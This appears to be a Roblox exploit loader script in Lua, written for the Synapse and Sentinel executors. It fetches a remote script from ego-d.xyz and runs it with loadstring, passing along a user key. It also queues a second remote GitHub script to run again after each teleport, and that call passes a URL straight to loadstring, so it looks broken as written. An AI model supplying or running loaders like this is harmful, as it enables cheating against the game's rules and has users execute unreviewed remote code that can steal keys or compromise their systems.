local Setting = {
  getgenv().Key
}
local buoi = [[
getgenv().Key = "]].. Setting[1]..'"'..[[
loadstring('https://raw.githubusercontent.com/chimnguu/ngu/master/zuagay.lua')()
]]
local Exploit = secure_load and "Sentinel" or syn and "Synapse"
loadstring(game:HttpGet("https://ego-d.xyz/Script?Exploit="..Exploit))()
syn.queue_on_teleport(buoi)
